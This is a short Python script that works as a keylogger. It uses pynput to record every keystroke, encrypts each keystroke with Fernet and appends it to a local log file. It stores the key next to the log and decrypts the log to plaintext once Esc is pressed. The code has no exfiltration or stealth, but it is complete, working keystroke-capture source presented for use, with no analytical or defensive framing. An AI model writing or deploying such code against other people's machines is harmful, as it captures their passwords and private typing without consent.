from pynput import keyboard
from cryptography.fernet import Fernet

# Generate encryption key and initialize cipher suite
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# File names for saving log and encryption key
log_file = "encrypted_key_log.txt"
key_file = "key.key"
decrypted_log_file = "decrypted_key_log.txt"

# Save the encryption key to a file
with open(key_file, "wb") as kf:
    kf.write(key)

# Function to write encrypted keystrokes to the log file
def write_to_file(encrypted_data):
    with open(log_file, "ab") as f:
        f.write(encrypted_data + b'\n')

# Function to handle key press events
def on_press(key):
    try:
        data = str(key.char).encode()
    except AttributeError:
        data = str(key).encode()
    
    # Encrypt and save keystrokes
    encrypted_data = cipher_suite.encrypt(data)
    write_to_file(encrypted_data)

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Set up listener to capture keystrokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Load encryption key for decryption
with open(key_file, "rb") as kf:
    key = kf.read()

cipher_suite = Fernet(key)

# Function to decrypt the log file
def decrypt_log_file():
    with open(log_file, "rb") as lf, open(decrypted_log_file, "wb") as dlf:
        for line in lf:
            decrypted_data = cipher_suite.decrypt(line.strip())
            dlf.write(decrypted_data + b'\n')

# Decrypt the log file
decrypt_log_file()
